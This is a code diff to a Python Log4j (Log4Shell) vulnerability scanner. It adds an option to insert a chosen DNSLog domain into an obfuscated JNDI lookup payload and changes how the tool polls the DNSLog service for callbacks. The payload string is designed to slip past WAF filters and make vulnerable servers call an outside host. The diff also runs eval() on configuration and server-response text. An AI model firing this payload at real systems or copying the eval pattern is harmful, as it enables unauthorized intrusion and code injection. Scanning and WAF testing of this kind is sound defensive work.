@@ -29,6 +29,8 @@ Scan Options:
     \tVerify the effectiveness of WAF rules about Log4j. This mode only support options with -t, -p.
     -l, --list
     \tList all payload can use.
+    -n <dnslog.domain>
+    \tIt will use the dnslog.domain as the part of payload, and it will not to monitoring the dnslog server.
 '''
 # global variable
 default_payload = '${${lower:${::::::::::-j}${upper:n}${lower:d}${upper:i}:${lower:l}${::::::::::-d}${lower:a}${' \
@@ -108,26 +110,37 @@ def GeneratePayloadId(url):
 def CheckDnslog():
     # print(" [+] Getting DNSLog")
     time.sleep(0.5)
-    dnslog_url = Log4j.dnslog_url + Log4j.dnslog_api
-    headers = {"token": Log4j.dnslog_token}
+    dnslog_url = Log4j.dnslog_api
+    headers = eval(Log4j.dnslog_token)
     try:
         response = requests.get(url=dnslog_url, headers=headers)
-        all_msg = eval(response.json()["Msg"])
+        try:
+            all_msg = eval(response.json()["Msg"])
+        except:
+            all_msg = response.text
         return all_msg
     except Exception as e:
         logErr(" [CheckDnslogError] " + ", " + e)
     return None
 
 
-def CheckDnsLogWithTenSecond(payload_ids):
+def CheckDnsLogWithTenSecond(payload_ids, log4j_message):
     print("[###] Monitoring the DNSLog [###]")
     start_time = time.time()
     # print(file)
+    Log4j.dnslog_api = log4j_message[0]
+    Log4j.dnslog_token = log4j_message[1]
     dnsLogDomains = []
     flag = 1
     outfilename = time.strftime('result/dnslog-result-%Y%m%d-%H%M.txt')
     while True:
         all_msg = CheckDnslog()
+        if type(all_msg) == type("a"):
+            for payload_id in payload_ids:
+                if payload_id in all_msg and payload_ids[payload_id] not in dnsLogDomains:
+                    print(" [+] Match: " + payload_ids[payload_id])
+                    dnsLogDomains.append(payload_ids[payload_id])
+            continue
         if not all_msg:
             if flag:
                 print(" [-] DNSLog None ...")
@@ -228,7 +241,7 @@ def LocalJndiServer(ip, port, payload_ids):
 class Log4j():
     payload = ""
     proxies = {}
-    dnslog_url = ""
+    dnslog_domain = ""
     dnslog_api = ""
     dnslog_token = ""
 
@@ -484,8 +497,9 @@ def scan(argv):
         local = 0
         ldap_ip = ""
         ldap_port = 0
+        no_monitor = 0
         try:
-            opts, args = getopt.getopt(argv, "t:f:j:J:m:L:hp:wl:s:",
+            opts, args = getopt.getopt(argv, "t:f:j:J:m:L:hp:wl:s:n:",
                                        ["target=", "file=", "jndipayload=", "local=", "help", "proxy=", "waf", "list=",
                                         "site=", "mode=", "JndiServer="])
             for opt, arg in opts:
@@ -533,6 +547,10 @@ def scan(argv):
                         else:
                             payload_ids[GeneratePayloadId(target)] = target
                             domains.append(target)
+                elif opt == '-n':
+                    print("[*] Will not monitoring the dnslog server and using the dnslog.conf")
+                    Log4j.dnslog_domain = arg
+                    no_monitor = 1
             # handle the opt -j which can choose the payload to use.
             if base_payload == "":
                 base_payload = default_payload
@@ -540,13 +558,13 @@ def scan(argv):
                 if local == 1:
                     base_payload = default_payload.replace("ns.dnslog.domain", str(ldap_ip) + ":" + str(ldap_port))
                     base_payload = base_payload.replace("payload_id.", "").replace("status", "payload_id")
-                Log4j.payload = base_payload
+                Log4j.payload = base_payload.replace("ns.dnslog.domain", Log4j.dnslog_domain)
                 print('[+] Using default payload: ' + Log4j.payload)
             else:
                 if local == 1:
                     base_payload = base_payload.replace("ns.dnslog.domain", str(ldap_ip) + ":" + str(ldap_port))
                     base_payload = base_payload.replace("payload_id.", "").replace("status", "payload_id")
-                Log4j.payload = base_payload
+                Log4j.payload = base_payload.replace("ns.dnslog.domain", Log4j.dnslog_domain)
                 print('[+] Using payload: ' + Log4j.payload)
             if waf_flag == 1:
                 # print("[+] WAF verify can only support the parameter with -t and -w")
@@ -562,14 +580,16 @@ def scan(argv):
 
         # multiprocess to receive the request from targets
         id_queue = multiprocessing.Queue()
-        if local:
+        if local and no_monitor == 0:
             print('[+] Run at local RMI&LDAP Server.')
             p = multiprocessing.Process(target=LocalJndiServer, args=(ldap_ip, int(ldap_port), payload_ids,))
             p.start()
         else:
-            print('[+] Run at remote DNSLog Server.')
-            p = multiprocessing.Process(target=CheckDnsLogWithTenSecond, args=(payload_ids,))
-            p.start()
+            if  no_monitor == 0:
+                print('[+] Run at remote DNSLog Server.')
+                Log4j_message = [Log4j.dnslog_api, Log4j.dnslog_token]
+                p = multiprocessing.Process(target=CheckDnsLogWithTenSecond, args=(payload_ids,Log4j_message, ))
+                p.start()
 
         print("[+] Running threading process.")
         m_count = 20
@@ -588,7 +608,8 @@ def scan(argv):
         while True:
             if (time.time() - start_time) > spendTime:
                 break
-        p.terminate()
+        if p:
+            p.terminate()
     except Exception as e:
         print(e)
         logErr(" [ScanError] " + str(e))
